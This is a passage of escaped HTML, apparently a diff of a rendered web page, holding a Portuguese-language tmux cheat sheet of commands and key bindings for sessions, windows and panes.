+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="anexar-a-uma-sessão-existente-com-o-nome-mysession">Anexar a uma sessão existente com o nome &lt;strong>mysession&lt;/strong>&lt;/h4>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux attach-session -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux attach -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux at -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou usar o &lt;strong>atalho&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux a -t mysession
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="desanexar-da-sessão">Desanexar da sessão&lt;/h3>
+&lt;ul>
+&lt;li>Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + d
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mostrar-todas-as-sessões">Mostrar TODAS as sessões&lt;/h3>
+&lt;ul>
+&lt;li>Listar TODAS as sessões&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux list-sessions
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ou usar o &lt;strong>atalho&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + s
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="trabalhando-com-janelas-do-tmux">Trabalhando com janelas do &lt;code>tmux&lt;/code>&lt;/h2>
+&lt;h3 id="iniciar-uma-nova-janela">Iniciar uma nova janela&lt;/h3>
+&lt;ul>
+&lt;li>Iniciar uma nova sessão com o nome &lt;strong>mysession&lt;/strong> e a janela &lt;strong>mywindow&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux new -s mysession -n mywindow
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Criar uma nova janela // Se você &lt;strong>já estiver dentro&lt;/strong> do &lt;code>tmux&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="renomear-uma-janela">Renomear uma janela&lt;/h3>
+&lt;ul>
+&lt;li>Renomear a janela atual&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + ,
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Fechar a janela atual&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &amp;amp;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mover-entre-janelas">Mover entre janelas&lt;/h3>
+&lt;ul>
+&lt;li>Janela anterior&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Próxima janela&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + n
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Selecionar janela pelo número&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + 0...9
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="reordenar-uma-janela">Reordenar uma janela&lt;/h3>
+&lt;ul>
+&lt;li>Trocar a janela 2 com a 1&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux swap-window -s &lt;span style="color:#ae81ff">2&lt;/span> -t &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="trabalhando-com-painéis">Trabalhando com painéis&lt;/h2>
+&lt;h3 id="alternar-painéis">Alternar painéis&lt;/h3>
+&lt;ul>
+&lt;li>Alternar para o último painel ativo&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + ;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="dividir-o-painel">Dividir o painel&lt;/h3>
+&lt;ul>
+&lt;li>Dividir painel verticalmente&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + %
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Dividir painel horizontalmente&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mover-painéis">Mover painéis&lt;/h3>
+&lt;ul>
+&lt;li>Mover o painel atual para a esquerda&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#f92672">{&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Mover o painel atual para a direita&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="alternar-entre-painéis">Alternar entre painéis&lt;/h3>
+&lt;ul>
+&lt;li>Alternar para o painel na direção&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + Up
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ctrl + b + Down
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ctrl + b + Left
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ctrl + b + Right
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="alternar-synchronize-panes">Alternar synchronize-panes&lt;/h3>
+&lt;ul>
+&lt;li>Enviar o mesmo comando para todos os painéis&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tmux setw synchronize-panes
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="alternar-entre-layouts-de-painéis">Alternar entre layouts de painéis&lt;/h3>
+&lt;ul>
+&lt;li>Alternar entre layouts&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
